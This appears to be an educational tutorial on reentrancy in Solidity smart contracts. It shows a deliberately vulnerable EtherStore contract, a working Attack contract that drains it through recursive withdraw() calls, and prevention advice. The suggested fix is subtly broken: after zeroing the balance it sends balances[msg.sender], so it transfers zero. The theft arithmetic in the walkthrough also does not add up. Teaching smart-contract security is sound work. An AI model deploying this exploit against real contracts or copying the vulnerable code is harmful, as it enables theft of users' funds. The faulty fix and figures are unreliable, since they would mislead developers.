## Reentrancy

Reentrancy is an attack that can occur when a bug in a contract may allow a malicious contract to reenter the contract unexpectedly during execution of the original function. This can be used to drain funds from a smart contract if used maliciously. Reentrancy is likely the single most impactful vulnerability in terms of total loss of funds by smart contract hacks, and should be considered accordingly.

[List of reentrancy attacks](https://github.com/pcaversaccio/reentrancy-attacks)

### External calls

Reentrancy can be executed by the availability of an external call to an attacker controlled contract. External calls allow for the callee to execute arbitrary code. The existence of an external call may not always be obvious, so it's important to be aware of any way in which an external call may be executed in your smart contracts.

##### ETH transfers

When you want to send Ether from your own smart contract to another smart contract, you trigger the `receive()` or `fallback()` functions on the other smart contract, as implemented in that contract.

An attacker can write any arbitrary logic into the `fallback()` method, such that anytime this contract is triggered by another one when transferring Ether, the `fallback()` logic is executed.


### Single function reentrancy

A single function reentrancy attack occurs when a vulnerable function is the same function that an attacker is trying to recursively call.

```solidity

// INSECURE
// DO NOT USE IN PRODUCTION. ONLY MEANT TO SERVE AS AN EXAMPLE

/** 
 * @title EtherStore
 * @dev  Etherstore is a contract where you can deposit and withdraw ETH.
*/

contract EtherStore {

    // The below mapping(balances), correlates an address to a number, i.e this address has this number of value.

    mapping(address => uint256) public balances;

    /**
     * @dev A function that allows anyone(public) to send(payable) ether to it
     * @dev It increases the balances of whoever called this function(msg.sender) to the value attached when calling this function
     * @dev msg.value is the value you attach when calling this function. 
     * @dev Add to the caller's existing balance, i.e balances[msg.sender] the value attached when the caller calls this function
    */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev A function that allows for withdrawals of funds
     * @dev Checks the balance of the the caller and ensures that the balance is greater than 0
     * @dev Calls either the `receive()` or `fallback()` of the caller in an attempt to send it ether
     * @dev ("") is calling the `receive()` or `fallback()`
     * @dev {value: bal} attempts to transfer caller's entire balance, i.e uint256 = bal = balances[msg.sender] to himself
     * @dev This is fine until the caller, msg.sender is another smart contract. Remember the blockchain is composable, i.e
     *   you can build on top of existing contracts by calling any of their functions in those contracts
     * 
     * @dev Requires sent to return true or it throws an error
     * @dev Reduces caller's balances to 0 as all his balances have been assumed to have been sent to him.
    */

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "You balance isn't greater than 0");

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

```solidity
contract Attack {

    /**
     * @dev Attacker imports contract EtherStore. 
     * @dev etherStore is an instance of EtherStore and any interactions to contract EtherStore in attacker contract 
    *   happens via etherStore
    */
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when contract EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

The above setup contracts showcase how re-entrancy attacks occur

1. A developer deploys contract EtherStore to the blockchain
2. Alice and Bob deposit 5 ether each into contract EtherStore by calling `deposit()` function. EtherStore now has 10 ether
3. An attacker, Eve deploys contract Attack with address of EtherStore in the constructor
4. The attacker calls `Attack.attack()` sending 1 ether. Eve gets 11 Ether back (5 Ether stolen from Alice and Bob, plus 1 Ether sent from her own contract `Attack`).

## What happened?

Attack was able to call `EtherStore.withdraw()` multiple times before `EtherStore.withdraw()` finished executing, i.e Eve was able to re-enter back into function `withdraw()` in contract `EtherStore` before it finished executing!



# Reentrancy prevention

The simplest reentrancy prevention mechanism is to use a ReentrancyGuard, which allows you to add a modifier, e.g. nonReentrant, to functions which may otherwise be vulnerable. 

For optimum security, use the checks-effects-interactions pattern. This is a simple rule of thumb for ordering smart contract functions.

The function should begin with checks, e.g. require and assert statements.

Next, the effects of the contract should be performed, i.e. state modifications.

Finally, we can perform interactions with other smart contracts, e.g. external function calls.

This structure is effective against reentrancy because when an attacker reenters the function, the state changes have already been made. For example:

```solidity
function withdraw() external {
  uint256 bal = balances[msg.sender];
  balances[msg.sender] = 0;
  (bool sent,) = msg.sender.call{value: balances[msg.sender]}("");
  require(sent);
}
```

Since the balance is set to 0 before any interactions are performed, if the contract is called recursively, there is nothing to send after the first transaction.
